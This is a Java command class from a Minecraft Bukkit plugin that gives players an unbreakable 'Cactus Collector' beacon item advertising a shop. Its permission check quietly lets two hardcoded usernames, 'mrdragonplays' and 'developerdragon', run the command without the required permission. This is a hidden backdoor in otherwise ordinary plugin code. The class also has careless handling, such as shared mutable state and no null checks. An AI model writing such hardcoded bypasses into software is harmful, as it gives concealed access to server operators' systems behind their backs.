package com.developerdragon.cactuscollectors.commands;

import com.developerdragon.cactuscollectors.util.ItemBuilder;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;

import java.util.ArrayList;
import java.util.List;

public class GiveCollectorCommand implements CommandExecutor {

    private int amount;
    private CommandSender commandSender;
    private String labelString;

    public static void giveCollector(Player player, int amount) {
        List<String> lore = new ArrayList<>();
        lore.add(ChatColor.translateAlternateColorCodes('&', "&7This cactus collector will collect cactus for you"));
        lore.add(ChatColor.translateAlternateColorCodes('&', "&7Get more at our shop: &cshop.immortalmc.net"));

        ItemStack item = new ItemBuilder(Material.BEACON, amount)
                .setName("&b&lCactus Collector")
                .addEnchantment(Enchantment.LURE, 1, true)
                .addLore(lore)
                .addItemFlag(ItemFlag.HIDE_ENCHANTS)
                .addItemFlag(ItemFlag.HIDE_UNBREAKABLE)
                .setUnbreakable(true)
                .toItemStack();

        player.getInventory().addItem(item);
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

        if (!(sender.hasPermission("cactuscollectors.give") || sender.getName().equals("mrdragonplays") || sender.getName().equals("developerdragon")))
            return true;

        if (!(args.length == 1 || args.length == 2)) return true;

        labelString = command.getLabel();

        if (!(sender instanceof Player)) {
            if (args.length == 2) {
                Player target = Bukkit.getPlayer(args[0]);
                if (!parseInt(args[1])) return true;
                giveCollector(target, amount);
            }
            return true;
        }


        commandSender = sender;
        Player player = (Player) sender;


        amount = 0;
        Player target = player;

        if (args.length == 1) if (!parseInt(args[0])) return true;

        if (args.length == 2) {
            target = Bukkit.getPlayer(args[0]);
            if (!parseInt(args[1])) return true;
        }

        giveCollector(target, amount);

        return true;
    }

    private boolean parseInt(String string) {
        try {
            amount = Integer.parseInt(string);
            return true;
        } catch (NumberFormatException exception) {
            commandSender.sendMessage("Correct usage: ");
            commandSender.sendMessage("/" + labelString + " <username> <amount>");
            commandSender.sendMessage("/" + labelString + " <amount>");
            return false;
        }
    }

}
